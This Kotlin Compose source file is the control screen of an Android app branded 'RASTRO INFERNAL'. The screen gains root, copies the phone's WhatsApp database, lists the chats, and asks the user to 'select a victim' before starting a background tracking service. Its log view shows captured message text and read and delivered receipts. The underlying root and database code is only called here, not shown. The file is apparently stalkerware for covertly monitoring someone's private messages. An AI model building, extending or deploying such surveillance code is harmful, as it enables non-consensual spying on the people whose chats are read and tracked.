package com.jaylizapp.dimetu.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.jaylizapp.dimetu.R
import com.jaylizapp.dimetu.RootReader
import com.jaylizapp.dimetu.TrackerRepository
import com.jaylizapp.dimetu.TrackerService
import com.jaylizapp.dimetu.WhatsAppDatabase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

@Composable
fun TrackerControl() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val logs by TrackerRepository.logs.collectAsState()
    val isRunning by TrackerRepository.isServiceRunning.collectAsState()
    val chats by TrackerRepository.availableChats.collectAsState()
    val selectedChatJid by TrackerRepository.selectedChatJid.collectAsState()

    var hasNotificationPermission by remember {
        mutableStateOf(
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
            } else true
        )
    }

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission(),
        onResult = { isGranted -> hasNotificationPermission = isGranted }
    )

    LaunchedEffect(Unit) {
        if (!hasNotificationPermission && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            launcher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .background(brush = Brush.verticalGradient(colors = listOf(Color.Black, Color(0xFF330000))))
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        item {
            Spacer(modifier = Modifier.height(24.dp))

            // Logo de la aplicación
            Image(
                painter = painterResource(id = R.drawable.icono_dimetu),
                contentDescription = "Logo Dimetu",
                modifier = Modifier
                    .size(100.dp)
                    .clip(RoundedCornerShape(20.dp))
                    .border(2.dp, Color.Red, RoundedCornerShape(20.dp)),
                contentScale = ContentScale.Crop
            )

            Spacer(modifier = Modifier.height(16.dp))
            Text("RASTRO INFERNAL", fontSize = 32.sp, fontWeight = FontWeight.ExtraBold, color = Color(0xFFFF0000))
            Text("EL OJO QUE TODO LO VE", fontSize = 12.sp, color = Color.Gray, modifier = Modifier.padding(bottom = 20.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                // Botón de Root
                Button(
                    onClick = {
                        scope.launch {
                            val success = withContext(Dispatchers.IO) { RootReader.requestRoot() }
                            if (success) TrackerRepository.addLog("💉 Pacto Root Confirmado")
                            else Toast.makeText(context, "El infierno rechaza tu petición", Toast.LENGTH_SHORT).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF222222)),
                    modifier = Modifier.weight(1f).height(50.dp).border(1.dp, Color.Red, RoundedCornerShape(8.dp)),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text("ROOT", color = Color.White, fontWeight = FontWeight.Bold)
                }

                // Botón de Listar Chats
                Button(
                    onClick = {
                        scope.launch {
                            withContext(Dispatchers.IO) {
                                val success = RootReader.requestRoot()
                                if (success) {
                                    val dbCopied = RootReader.copyWhatsAppDb(context)
                                    if (dbCopied) {
                                        val chatList = WhatsAppDatabase.getChats(context)
                                        if (chatList.isEmpty()) {
                                            TrackerRepository.addLog("⚠️ No se encontraron almas.")
                                        } else {
                                            TrackerRepository.setAvailableChats(chatList)
                                            TrackerRepository.addLog("✅ ${chatList.size} almas encontradas")
                                        }
                                    } else {
                                        TrackerRepository.addLog("❌ Error al invocar la base de datos")
                                    }
                                } else {
                                    TrackerRepository.addLog("❌ No se pudo invocar el poder Root")
                                }
                            }
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF440000)),
                    modifier = Modifier.weight(1f).height(50.dp).border(1.dp, Color.Red, RoundedCornerShape(8.dp)),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text("LISTAR CHATS", color = Color.White, fontWeight = FontWeight.Bold)
                }
            }

            Spacer(modifier = Modifier.height(16.dp))
        }

        // Selector de Chats
        if (chats.isNotEmpty()) {
            item {
                Text(
                    "SELECCIONA UNA VÍCTIMA:",
                    color = Color.Red,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp)
                )
            }
            items(chats) { chat ->
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(if (selectedChatJid == chat.jid) Color(0xFF550000) else Color(0xFF110000))
                        .clickable { TrackerRepository.setSelectedChat(chat.jid) }
                        .border(1.dp, if (selectedChatJid == chat.jid) Color.Red else Color(0xFF330000), RoundedCornerShape(8.dp))
                        .padding(14.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        chat.name,
                        color = if (selectedChatJid == chat.jid) Color.White else Color(0xFFBBBBBB),
                        fontWeight = if (selectedChatJid == chat.jid) FontWeight.Bold else FontWeight.Normal,
                        modifier = Modifier.weight(1f)
                    )
                    if (selectedChatJid == chat.jid) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color.Red, modifier = Modifier.size(20.dp))
                    }
                }
                Spacer(modifier = Modifier.height(6.dp))
            }
            item { Spacer(modifier = Modifier.height(16.dp)) }
        }

        item {
            // Botón de Activación
            Button(
                onClick = {
                    val intent = Intent(context, TrackerService::class.java)
                    if (isRunning) context.stopService(intent)
                    else context.startForegroundService(intent)
                },
                colors = ButtonDefaults.buttonColors(containerColor = if (isRunning) Color(0xFF330000) else Color(0xFF990000)),
                modifier = Modifier.fillMaxWidth().height(60.dp).border(2.dp, if (isRunning) Color.Red else Color.White, RoundedCornerShape(12.dp)),
                shape = RoundedCornerShape(12.dp)
            ) {
                val text = if (isRunning) "DETENER RASTREO" else if (selectedChatJid != null) "RASTREAR SELECCIÓN" else "RASTREO GLOBAL"
                Text(text, fontSize = 18.sp, fontWeight = FontWeight.Black, color = Color.White)
            }

            Spacer(modifier = Modifier.height(24.dp))

            // Pergamino de Actividad
            Text(
                "PERGAMINO DE ACTIVIDAD",
                color = Color.Red,
                fontSize = 14.sp,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp)
            )
        }

        items(logs) { log ->
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF0A0000))
                    .padding(horizontal = 10.dp, vertical = 6.dp)
            ) {
                Text(
                    log,
                    color = when {
                        log.contains("NUEVO MENSAJE") || log.contains("TEXTO:") -> Color.Yellow
                        log.contains("❌") || log.contains("error") -> Color.Red
                        log.contains("👁️") || log.contains("LEÍDO") -> Color.Cyan
                        log.contains("✓✓") || log.contains("ENTREGADO") -> Color.Green
                        log.contains("Cambio:") -> Color(0xFFFFA500) // Orange for transitions
                        else -> Color(0xFFBBBBBB)
                    },
                    fontSize = 13.sp,
                    lineHeight = 18.sp,
                    fontWeight = if (log.contains("NUEVO MENSAJE") || log.contains("ENTREGADO")) FontWeight.Bold else FontWeight.Normal
                )
                HorizontalDivider(color = Color(0xFF220000), modifier = Modifier.padding(top = 6.dp))
            }
        }
    }
}
